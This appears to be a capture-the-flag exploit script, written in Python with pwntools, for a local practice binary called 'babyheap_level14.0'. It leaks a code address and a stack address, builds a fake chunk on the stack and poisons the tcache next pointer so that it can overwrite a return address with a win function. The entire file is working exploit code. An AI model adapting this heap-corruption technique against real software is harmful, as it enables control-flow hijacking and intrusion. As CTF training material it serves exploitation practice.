#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level14.0_patched'
p = process(binary)

s = '''
b malloc
b free
b * main+325

#set follow-fork-mode parent
set detach-on-fork off 
'''

#gdb.attach(p, s)

context.log_level = 'debug'






# leaking a .text address (get win)
p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline(b"scanf")
p.sendline("0")
p.sendline(b"AA")

p.sendline(b"echo 0 0")
p.sendline(b"echo 0 224")

p.recvuntil(b"Data: ")
p.recvuntil(b"Data: ")

leak2 = p.recvuntil(b"\n", drop=True)
leak2 = u64(leak2.ljust(8, b"\x00"))
log.info(f"Leaked address 2: {hex(leak2)}")

win = leak2 - 0x19d6
print(hex(win))




# creating a fake chunk to read addresses on stack
p.sendline(b"stack_scanf " + b'B' * 0x30 + p64(0) + p64(0x201))
# freeing a stack address, then malloc to get a fake chunk 
p.sendline("stack_free")
p.sendline("malloc 4 500")



# using that fake chunk (chunk 4) to leak a stack address for arbitrary write
p.sendline(b"echo 4 64")
p.recvuntil(b"Data: ")

leak1 = p.recvuntil(b"\n", drop=True)
leak1 = u64(leak1.ljust(8, b"\x00"))
#log.info(f"Leaked address 1: {hex(leak1)}")
rip = leak1 - 0xe8
#log.info(f"Leaked address 1: {hex(rip)}")





# free some chunks, overwrite next* pointer, malloc'ing a stack address and overwrite it with scanf
p.sendline("free 0")
p.sendline("free 1")


p.sendline(b"scanf")
p.sendline(b"1") 
p.sendline(p64(rip))

p.sendline("malloc 1 100")
p.sendline("malloc 0 100")

p.sendline(b"scanf")

p.sendline(b"0") 

p.sendline(p64(win))



p.sendline("quit")
p.interactive()



